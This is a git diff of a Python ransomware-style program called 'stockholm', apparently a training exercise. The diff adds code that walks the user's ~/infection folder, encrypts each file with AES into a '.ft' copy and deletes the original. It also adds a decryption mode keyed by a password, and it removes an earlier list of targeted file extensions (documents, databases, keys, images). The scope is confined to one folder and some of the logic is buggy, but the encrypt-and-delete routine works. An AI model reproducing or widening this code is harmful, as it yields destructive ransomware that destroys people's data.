@@ -3,39 +3,22 @@ from crypt import crypt
 from distutils import extension
 from importlib.resources import path
 from pkgutil import extend_path
-import random
-import string
+
 from banner.banner_ import logo
 from args.args import ft_args
 from clear.clear import clear
-import sys, time, os, getpass, argparse
-from cryptography.fernet import Fernet
+import sys, time, os, getpass, argparse, pyAesCrypt,  random, string
+
 
 
 class stockholm(object):
     # Constructor
-    extensiones = [".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2 ", ".docb", ".potx", ".sldx", ".jpeg",
-                    ".mp4", ".dch", ".frm", ".slk ", ".docm", ".potm", ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif ", ".dot",
-                    ".pst", ".sldm", ".bmp", ".avi", ".pl", ".dbf", ".stc ", ".dotm", ".ost", ".vdi", ".png", ".asf", ".vb",
-                    ".db", ".sxc ", ".dotx", ".msg", ".vmdk", ".gif", ".mpeg", ".vbs", ".mdb", ".ots ", ".xls", ".eml", ".vmx",
-                    ".raw", ".vob", ".ps1", ".accdb", ".ods ", ".xlsm", ".vsd", ".aes", ".tif", ".wmv", ".cmd", ".sqlitedb",
-                    ".max ", ".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js", ".sqlite3", ".3ds ", ".xlw", ".txt", ".PAQ",
-                    ".nef", ".swf", ".asm", ".asc", ".uot ", ".xlt", ".csv", ".bz2", ".psd", ".wav", ".h", ".lay6", ".stw",
-                    ".xlm", ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw ", ".xlc", ".123", ".bak", ".svg", ".sh",
-                    ".cpp", ".mml", ".ott ", ".xltx", ".wks", ".tar", ".djvu", ".class", ".c", ".sxm", ".odt ", ".xltm", ".wk1",
-                    ".tgz", ".m4u", ".jar", ".cs", ".otg", ".pem ", ".ppt", ".pdf", ".gz", ".m3u", ".java", ".suo", ".odg",
-                    ".p12 ", ".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop", ".csr ", ".pptm", ".onetoc2", ".rar",
-                    ".wma", ".asp", ".ldf", ".std", ".crt ", ".pot", ".snt", ".zip", ".flv", ".php", ".mdf", ".sxd", ".key ",
-                    ".pps", ".hwp", ".backup", ".3g2", ".jsp", ".ibd", ".otp", ".pfx ", ".ppsm", ".602", ".iso", ".mkv",
-                    ".brd", ".myi", ".odp", ".der ", ".ppsx", ".sxi"]  # List of extensions to be encrypted and decrypted
 
     def __init__(self): # Constructor of the class (self is the object itself)
         self.clear() # Clear the terminal
         self.slowprint(logo) # Print the banner
         self.args = ft_args()
-        self.key = self.keygen() # Generate the key
-        self.key_save() # Save the key
-        self.path_files() # Create the directory
+        self.path_files()   # Get the path of the files to be encrypted or decrypted
 
     def clear(self):
         clear()
@@ -58,7 +41,6 @@ class stockholm(object):
         key = getpass.getpass("\nLa clave debe tener 16 caracteres o más:  ") # Get the key from the user and save it in a variable
         if len(key) < 16:
             self.clear()
-            #self.slowprint(logo)
             print("\n ingresa una clave válida!! >= a 16 caracteres: \n")
             self.key_load() # Recursive call to the function esto es recursividad lol xd
         self.key = key
@@ -101,20 +83,41 @@ class stockholm(object):
             self.key_save() # Recursive call to the function esto es recursividad lol xd
         #time.sleep(0.019) # Wait 0.019 seconds to continue
         #self.clear() # Clear the terminal
-    def ft_extension(self): # funcion para cambiar la extension de los archivos a encriptarq
-        pass
 
     def encrypt_files(self):
-        pass
+        buffer_size = 256 * 1024 # Buffer size of 256KB
+        key = self.keygen() # Generate the key
+        for path, curerentDirectory, files in os.walk(os.path.expanduser("~" + '/infection')): # Loop through the files in the directory
+            for file in files:
+                pyAesCrypt.encryptFile(os.path.join(path, file), os.path.join(path, file + '.ft'), key,       buffer_size) # Encrypt the file
+                os.remove(os.path.join(path, file)) # Delete the original file
         if self.args.silent == False :
-            print("\nEncrypting files...\n")
-        print ("\nno se como hacer esto xd lol xdda pero sabre que hacer xd")
+            for file in files:
+                print("\nEncriptando: " + os.path.join(path, file + '.ft'), end='\n') # Print the name of the encrypted file
+
+           #print ("\nno se como hacer esto xd lol xdda pero sabre que hacer xd")
+
 
     def decrypt_files(self):
-        print("\nDecrypting files...\n")
+        buffer_size = 256 * 1024
+        key = getpass.getpass("Ingresa la clave: ")
+        for path, currentDirectory, files in os.walk(os.path.expanduser("~" + '/infection')): # Loop through the files in the directory
+            try:
+                for file in files:
+                    if file.endswith(".ft"):
+                        pyAesCrypt.decryptFile(os.path.join(path, file), os.path.join(path, file[:-3]), key, buffer_size) # Decrypt the file
+                        os.remove(os.path.join(path, file)) # Delete the original file
+                    else:
+                        print("\nNo se puede desencriptar: " + os.path.join(path, file)) # Print the name of the file that couldn't be decrypted
+            except ValueError:
+                self.clear()
+                self.slowprint("\nClave incorrecta \n")
+                self.decrypt_files()
+        if self.args.silent == False :
+            for file in files:
+                print("Desencriptando: " + os.path.join(path, file[:-3]), end='\n')
 
     def path_files(self):
-        self.print_key()
         if os.path.isdir(os.path.expanduser('~') + "/infection") == True:
             if self.args.reverse == True:
               self.decrypt_files()
@@ -126,15 +129,18 @@ class stockholm(object):
             os.mkdir(os.path.expanduser("~")+'/infection')
             print('Directorio creado\n')
             self.path_files() # Recursive call to the function esto es recursividad lol xd
-
+            #return self.path
 
 
 ########################################################################################################################
 stockholm = stockholm()
 
-
 def main():
-    pass
+    if stockholm.args.reverse == False:
+        stockholm.print_key()
+        stockholm.key_save()
+
+
 
 if __name__ == "__main__":
     main()
